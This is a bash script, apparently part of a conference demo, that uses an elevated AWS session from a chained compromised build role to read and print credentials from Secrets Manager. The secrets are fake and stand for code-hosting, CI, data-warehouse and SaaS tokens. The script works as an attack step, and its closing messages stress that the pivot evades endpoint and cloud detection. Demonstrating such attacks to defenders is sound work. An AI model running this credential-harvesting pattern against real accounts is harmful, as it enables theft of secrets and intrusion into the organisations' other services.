#!/usr/bin/env bash
# Speaker Part B, step 3: demonstrate the pivot out of AWS via Secrets Manager.
#
# Reads each of the pre-created "pivot target" secrets, showing how a
# compromised AWS session can extend reach into code hosting, the CI platform,
# data warehouses, and SaaS vendors. Values are fake but the pattern is real.
#
# Prereqs:
#   - terraform/speaker-demo applied
#   - Either:
#       source /tmp/.rtv-demo-chain-creds    (from 02-abuse-iam-chain.sh)
#     or run with the elevated session active by other means
#
# Demonstration narrative:
#   "Here's where the compromise leaves AWS. These secrets represent what every
#    real organization stores in their secret manager: tokens that unlock code
#    hosting, their CI platform, data warehouses, and every SaaS vendor they
#    depend on. AWS was never the destination. It was the pivot."
set -euo pipefail

: "${AWS_REGION:?set AWS_REGION}"

SECRETS=(
  "demo/pivot/code-hosting-admin-token"
  "demo/pivot/ci-platform-admin-key"
  "demo/pivot/data-warehouse-creds"
  "demo/pivot/saas-api-key"
)

echo "=== Pivoting out of AWS via Secrets Manager ==="
echo ""
echo "Running as:"
aws sts get-caller-identity --region "$AWS_REGION" | jq
echo ""

for SECRET in "${SECRETS[@]}"; do
  echo "-----------------------------------------------------------------------"
  echo "  Reading: ${SECRET}"
  echo "-----------------------------------------------------------------------"
  VALUE=$(aws secretsmanager get-secret-value \
    --secret-id "$SECRET" \
    --query SecretString --output text \
    --region "$AWS_REGION" 2>&1) || {
      echo "  ERROR: $VALUE"
      continue
    }

  # Pretty-print JSON if it is JSON, otherwise print raw
  if echo "$VALUE" | jq . >/dev/null 2>&1; then
    echo "$VALUE" | jq .
  else
    echo "$VALUE"
  fi
  echo ""
done

echo "=== Pivot complete ==="
echo ""
echo "What just happened:"
echo "  - A compromised OIDC-trusted build role chained into an elevated role."
echo "  - That role read out credentials for code hosting, CI, data warehouse,"
echo "    and a SaaS vendor. All of it in-AWS, all of it native services."
echo "  - Zero outbound traffic to attacker infrastructure."
echo "  - Zero implants on any host."
echo "  - None of the signals traditional endpoint or cloud detection looks for."
echo ""
echo "Run 99-teardown.sh when you are done to clean up the live-created Lambda"
echo "and EventBridge rule. Terraform owns the rest."
